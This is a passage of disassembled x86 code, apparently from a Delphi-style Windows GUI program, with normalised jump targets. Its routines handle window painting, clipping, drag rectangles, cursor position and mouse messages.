mov edx 0xb00e
mov eax ebx
call sub_443750
pop ebx
retn
or [ ebx + 0x98 ] 0x10
mov eax [ ebx + 0x68 ]
call sub_41d3b4
mov [ ebx + 0x84 ] eax
sub_442788
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_442778
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
xor eax eax
call sub_43f720
mov eax esi
call sub_43f720
jmp r-xdata
sub_4427c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x198 ]
mov edx ebx
call sub_414418
test eax eax
jl r-xdata
mov edx [ ebx + 0x30 ]
mov edi [ edx + 0x198 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_41425c
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x198 ]
mov ecx ebx
mov edx esi
call sub_414438
mov cl 0x1
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_442998
mov eax ebx
call sub_45a318
test [ eax + 0x54 ] 0x4
je r-xdata
mov dl 0x1
mov si 0xffd1
call sub_403540
sub_442840
mov ecx [ eax + 0x30 ]
test ecx ecx
je r-xdata
retn
test dl dl
je r-xdata
xor edx edx
call sub_4427c0
mov edx [ ecx + 0x198 ]
mov edx [ edx + 0x8 ]
dec edx
call sub_4427c0
jmp r-xdata
sub_442864
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4428fa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
mov eax [ ebx + 0x30 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov esi eax
push 0x0
mov eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x40 ]
push eax
push esi
call SetViewportOrgEx
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push esi
call IntersectClipRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_442901
lea eax [ ebp - 0xc ]
call sub_404094
retn
mov eax [ ebx + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405ca4
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bcf8
call sub_403ad0
sub_44290c
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
mov edi [ eax + 0x198 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax edi
call sub_414418
mov esi eax
test esi esi
jle r-xdata
mov [ ebp - 0x1 ] 0x0
dec esi
mov edx esi
mov eax edi
call sub_4143bc
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test esi esi
jg r-xdata
test [ ebx + 0x50 ] 0x40
je r-xdata
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_441ef0
lea eax [ ebp - 0x24 ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call IntersectRect
mov eax [ ebp + 0x8 ]
add eax 0xffffffec
push eax
lea eax [ ebp - 0x11 ]
push eax
call EqualRect
test eax eax
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_442998
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x15 ] cl
mov ebx edx
mov [ ebp - 0x4 ] eax
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_449088
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_441ef0
cmp [ ebp - 0x15 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
test [ eax + 0x50 ] 0x40
jne r-xdata
neg al
sbb eax eax
push eax
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448d84
push eax
call InvalidateRect
push ebp
call sub_44290c
pop ecx
test al al
je r-xdata
mov al 0x1
sub_442a34
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_45a2f0
mov esi eax
test esi esi
je r-xdata
mov eax [ edi + 0x8 ]
push eax
mov ecx [ edi + 0x4 ]
mov edx 0xb043
mov eax ebx
call sub_443750
mov [ edi + 0xc ] eax
cmp ebx esi
je r-xdata
mov edx edi
mov eax esi
mov si 0xffc9
call sub_403540
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_442a98
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_449088
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x50 ] 0x40
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448d84
push eax
call GetDC
mov [ ebp - 0x8 ] eax
xor ecx ecx
push ebp
push sub_442b71
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x44 ]
mov ecx edx
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x4c ]
push ecx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x40 ]
mov ecx eax
mov ebx [ ebp - 0x4 ]
add ecx [ ebx + 0x48 ]
push ecx
push edx
push eax
mov eax [ ebp - 0x8 ]
push eax
call IntersectClipRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ecx [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
call sub_446b90
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
call sub_448d84
push eax
call ReleaseDC
retn
sub_442c10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi ecx
mov ebx edx
mov edi eax
mov eax edi
mov edx [ r-xdata ]
call sub_4034d0
test al al
je r-xdata
mov eax edi
call sub_443784
cmp [ rw-data ] 0x0
je r-xdata
cmp [ edi + 0x9b ] 0x1
je r-xdata
xor eax eax
mov [ rw-data ] eax
test [ edi + 0x54 ] 0x1
je r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd78
call sub_403ad0
test esi esi
jge r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_442094
mov eax [ esp + 0x8 ]
mov [ esp ] eax
mov eax [ esp + 0xc ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_406ca4
push eax
xor ecx ecx
mov edx 0x202
mov eax edi
call sub_443750
add esp 0x10
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
mov esi [ eax + 0x8 ]
mov ecx esi
mov edx ebx
mov eax edi
call sub_4408a0
sub_442cd4
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_442d0c
test al al
je r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
call sub_440ad8
pop esi
pop ebx
retn
pop esi
pop ebx
retn
mov [ rw-data ] 0xffffffff
sub_442d18
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] 0x0
cmp [ eax + 0xf2 ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0xc
mov [ esi ] 0x1
push ecx
mov ecx [ ebp + 0x10 ]
push ecx
mov cl [ ebp + 0xc ]
push ecx
push esi
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xf4 ]
call [ ebx + 0xf0 ]
sub_442d54
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xea ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0xec ]
call [ ebx + 0xe8 ]
sub_442da0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x11a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x11c ]
call [ ebx + 0x118 ]
sub_442dcc
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov ebx edx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x38 ]
call sub_4424f4
mov edi eax
mov eax [ ebx + 0x38 ]
call sub_4424e0
mov ebp eax
mov [ esp + 0x10 ] edi
fild [ esp + 0x10 ]
fmul [ ebx + 0x20 ]
fild [ ebx + 0xc ]
fsubrp st1
fstp [ esp ]
fwait
mov [ esp + 0x10 ] ebp
fild [ esp + 0x10 ]
fmul [ ebx + 0x28 ]
fild [ ebx + 0x10 ]
fsubrp st1
fstp [ esp + 0x8 ]
fwait
lea esi [ ebx + 0x44 ]
fld [ esp ]
call sub_402b00
mov [ esi ] eax
fld [ esp + 0x8 ]
call sub_402b00
mov [ esi + 0x4 ] eax
add edi [ esi ]
mov [ esi + 0x8 ] edi
add ebp [ esi + 0x4 ]
mov [ esi + 0xc ] ebp
lea edx [ ebx + 0x44 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x2c ]
jmp r-xdata
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
jne r-xdata
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebx + 0x44 ]
push eax
mov eax [ ebx + 0x4 ]
call sub_448d84
push eax
call GetWindowRect
mov eax [ ebx + 0x4 ]
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov dl [ ebx + 0x54 ]
push edx
lea edx [ ebx + 0x44 ]
push edx
mov eax [ eax + 0x17c ]
mov ecx [ ebx + 0x58 ]
mov edx [ ebx + 0x38 ]
mov ebx [ eax ]
call [ ebx + 0x24 ]
sub_442eb0
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x10a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x4
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x10c ]
call [ ebx + 0x108 ]
sub_442efc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov [ ebp - 0x1 ] dl
mov ebx eax
mov [ ebp - 0xa ] 0x0
cmp [ ebx + 0x13a ] 0x0
je r-xdata
cmp [ ebp - 0xa ] 0x0
jne r-xdata
push esi
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0xa ]
push eax
mov cl [ ebp - 0x1 ]
mov edx ebx
mov eax [ ebx + 0x13c ]
call [ ebx + 0x138 ]
mov al [ ebp - 0xa ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebx + 0xa4 ] esi
jmp r-xdata
mov ecx [ ebx + 0xa4 ]
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x78
jge r-xdata
test ecx ecx
setl al
mov ecx eax
mov eax [ ebx + 0xa4 ]
cdq
xor eax edx
sub eax edx
mov esi eax
sub esi 0x78
mov [ ebx + 0xa4 ] esi
test cl cl
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe0
call sub_403540
mov [ ebp - 0xa ] al
test esi esi
je r-xdata
lea ecx [ ebp - 0x9 ]
mov dl [ ebp - 0x1 ]
mov eax ebx
mov si 0xffe1
call sub_403540
mov [ ebp - 0xa ] al
jmp r-xdata
neg esi
mov [ ebx + 0xa4 ] esi
sub_442fc0
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x142 ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x144 ]
call [ ebx + 0x140 ]
sub_44300c
push ebx
push esi
push edi
add esp 0xfffffff4
mov esi ecx
lea edi [ esp + 0x1 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ esp ] dl
mov [ esp + 0x9 ] 0x0
cmp [ eax + 0x14a ] 0x0
je r-xdata
mov al [ esp + 0x9 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x1 ]
push edx
lea edx [ esp + 0xd ]
push edx
mov ebx eax
mov cl [ esp + 0x8 ]
mov edx eax
mov eax [ ebx + 0x14c ]
call [ ebx + 0x148 ]
sub_443058
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
mov ebx eax
cmp [ ebp - 0x1 ] 0x0
je r-xdata
push esi
add esi 0x44
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
add esi 0x5c
lea edi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
jmp r-xdata
call GetDesktopWindow
mov [ ebp - 0x8 ] eax
push 0x402
push 0x0
mov eax [ ebp - 0x8 ]
push eax
call GetDCEx
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_443173
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x40 ]
call sub_41d9fc
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
mov esi [ ebp - 0x20 ]
sub eax esi
sub eax ebx
push eax
mov edi [ ebp - 0x1c ]
push edi
mov eax esi
add eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax edi
sub eax ebx
push eax
push ebx
mov eax edi
add eax ebx
push eax
mov eax [ ebp - 0x18 ]
sub eax ebx
push eax
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
push ebx
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
sub eax ebx
push eax
mov eax [ ebp - 0x14 ]
sub eax ebx
push eax
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
push 0x5a0049
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
sub eax ebx
push eax
push ebx
push edi
push esi
mov eax [ ebp - 0xc ]
push eax
call PatBlt
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_44317a
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call ReleaseDC
retn
sub_4431ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov edi edx
mov [ esp ] eax
mov ebp [ edi + 0x8 ]
mov esi [ ebp + 0x8 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4034d0
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x5 ]
mov edx ebp
mov eax [ esp ]
call sub_442094
mov al [ edi + 0x4 ]
sub al 0x3
jb r-xdata
test bl bl
jne r-xdata
mov [ esp + 0x4 ] 0x1
test bl bl
je r-xdata
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4034f4
mov esi [ eax + 0x38 ]
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ esp + 0xc ]
mov si 0xffde
call sub_403540
mov eax [ esp + 0x9 ]
push eax
mov al [ edi + 0x4 ]
push eax
lea eax [ esp + 0xc ]
push eax
mov ecx [ esp + 0x11 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffc4
call sub_403540
jmp r-xdata
test bl bl
je r-xdata
jmp r-xdata
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al [ esp + 0x4 ]
mov [ edi + 0xc ] eax
jmp r-xdata
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ esp + 0x4 ]
mov si 0xffcb
call sub_403540
mov eax [ esp + 0x9 ]
push eax
mov ecx [ esp + 0x9 ]
mov edx esi
mov eax [ ebp + 0xc ]
mov si 0xffb7
call sub_403540
jmp r-xdata
sub_44329c
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
test edi edi
je r-xdata
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
cmp edi 0xffffffff
jne r-xdata
lea ecx [ ebp - 0x24 ]
mov edx [ ebx + 0x44 ]
mov eax [ ebx + 0x40 ]
call sub_412edc
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
cmp [ eax + 0x1a7 ] 0x0
je r-xdata
mov eax ebx
call sub_443784
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax ebx
call sub_4424e0
push eax
lea eax [ ebp - 0x34 ]
push eax
mov eax ebx
call sub_4424f4
mov ecx eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x1c ]
call sub_412f2c
lea esi [ ebp - 0x34 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44347c
mov [ ebp - 0x5 ] al
jmp r-xdata
lea ecx [ ebp - 0x24 ]
lea edx [ ebp - 0x1c ]
mov eax esi
call sub_442068
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x20 ]
mov [ ebp - 0x18 ] eax
cmp [ eax + 0x17c ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebx + 0xa0 ]
mov ecx ebx
mov edx edi
mov si 0xffbe
call sub_403540
test al al
jne r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ebp - 0x1c ]
mov eax [ eax + 0x17c ]
mov edx ebx
mov esi [ eax ]
call [ esi + 0x14 ]
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0xa0 ]
call sub_448d84
push eax
call MapWindowPoints
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43fc64
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_443467
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebx + 0xa0 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
xor esi esi
call sub_448d84
mov esi eax
jmp r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0xc ]
mov [ eax + 0x4 ] edi
mov eax [ ebp - 0xc ]
mov dl [ ebp + 0x8 ]
mov [ eax + 0x54 ] dl
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov [ eax + 0x58 ] edx
mov eax [ ebp - 0xc ]
push edi
lea edi [ eax + 0x44 ]
lea esi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
push 0x1
lea eax [ ebp - 0x1c ]
push eax
mov eax edi
call sub_448d84
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x18 ]
push eax
mov ecx [ ebp - 0x1c ]
mov edx [ ebp - 0xc ]
mov eax edi
mov si 0xffb7
call sub_403540
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_403344
retn
push 0x2
lea eax [ ebp - 0x1c ]
push eax
push 0x0
push esi
call MapWindowPoints
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_441ef0
test esi esi
je r-xdata
sub_44347c
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi eax
mov ebx [ edi + 0xa0 ]
test ebx ebx
je r-xdata
mov al 0x1
mov ecx edi
xor edx edx
mov eax ebx
mov si 0xffbe
call sub_403540
test al al
jne r-xdata
mov eax ebx
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov edx esp
mov eax edi
call sub_444300
mov esi eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov ecx esp
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403540
mov eax esi
call sub_441f98
push eax
lea eax [ esp + 0x14 ]
push eax
mov eax esi
call sub_441f54
mov ecx eax
xor edx edx
xor eax eax
call sub_412f04
lea ecx [ esp + 0x10 ]
mov edx esi
mov eax edi
mov si 0xffcc
call sub_403540
jmp r-xdata
mov ebx eax
test bl bl
je r-xdata
sub_443520
push ebx
push ecx
mov [ esp ] 0x1
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
push ecx
lea ecx [ esp + 0x4 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_443550
push ebx
push esi
add esp 0xfffffff0
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov esi eax
cmp [ esi + 0x5b ] 0x5
je r-xdata
mov al 0x1
mov eax [ esp ]
mov eax [ eax ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
mov eax [ eax ]
mov [ esp + 0xc ] eax
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov dl [ esi + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
mov ecx [ esp ]
mov ebx [ esp + 0x8 ]
mov [ ecx ] ebx
add cl 0xfd
sub cl 0x2
jae r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0xc ]
mov [ edx ] ecx
jmp r-xdata
sub dl 0x3
jae r-xdata
sub_4435bc
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi edx
mov esi eax
mov ecx [ esp ]
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x30 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx edi
mov eax esi
call sub_44367c
sub_4435ec
push ebp
mov ebp esp
push ebx
cmp [ eax + 0xca ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x8
push ecx
mov ecx [ ebp + 0xc ]
push ecx
mov ecx [ ebp + 0x8 ]
push ecx
mov ecx edx
mov ebx eax
mov edx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_44361c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
push ebx
call GetCursorPos
mov ecx esp
mov edx ebx
mov eax esi
call sub_442094
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
pop ecx
pop edx
pop esi
pop ebx
retn
sub_443648
push esi
test [ eax + 0x50 ] 0x4
je r-xdata
xor eax eax
pop esi
retn
mov esi [ edx ]
cmp esi 0x204
je r-xdata
mov al 0x1
pop esi
retn
cmp esi 0x205
je r-xdata
cmp esi 0x200
je r-xdata
cmp esi 0x206
je r-xdata
sub_44367c
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi ecx
mov esi edx
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x14 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp ] edx
mov [ esp ] edx
jmp r-xdata
xor edx edx
mov [ esp + 0x4 ] edx
mov [ esp + 0x4 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x10 ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0x8 ] edx
mov [ esp + 0x8 ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0xc ]
test edx edx
jbe r-xdata
xor edx edx
mov [ esp + 0xc ] edx
mov [ esp + 0xc ] edx
jmp r-xdata
mov edx [ eax + 0x74 ]
mov edx [ edx + 0x8 ]
test edx edx
jbe r-xdata
cmp [ esp ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp + 0x8 ]
jle r-xdata
lea edx [ esp + 0x8 ]
push edx
lea edx [ esp + 0x10 ]
push edx
lea ecx [ esp + 0xc ]
lea edx [ esp + 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
cmp [ esp + 0x8 ] 0x0
jle r-xdata
cmp [ esp + 0xc ] 0x0
jle r-xdata
mov eax [ esi ]
cmp eax [ esp ]
jge r-xdata
mov eax [ esp + 0x8 ]
mov [ esi ] eax
jmp r-xdata
cmp [ esp + 0x4 ] 0x0
jle r-xdata
mov eax [ edi ]
cmp eax [ esp + 0xc ]
jle r-xdata
mov eax [ esp ]
mov [ esi ] eax
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ edi ]
cmp eax [ esp + 0x4 ]
jge r-xdata
mov eax [ esp + 0xc ]
mov [ edi ] eax
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ edi ] eax
sub_443750
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] ecx
mov edx [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
xor edx edx
mov [ ebp - 0x4 ] edx
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea edx [ ebp - 0x10 ]
mov ebx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_443784
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
cmp [ ebx + 0xa0 ] 0x0
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xac ] eax
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xa8 ] eax
pop ebx
retn
pop ebx
retn
cmp [ ebx + 0x9c ] 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebx + 0xb4 ] eax
jmp r-xdata
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
cmp [ ebx + 0x9c ] 0x1
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ ebx + 0xb0 ] eax
mov eax [ ebx + 0xa0 ]
mov al [ eax + 0x5b ]
add al 0xfd
sub al 0x2
jae r-xdata
sub_44381c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax [ ebx ]
cmp eax 0x100
jb r-xdata
mov eax esi
call sub_45a2f0
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp eax 0x200
jb r-xdata
cmp eax 0x108
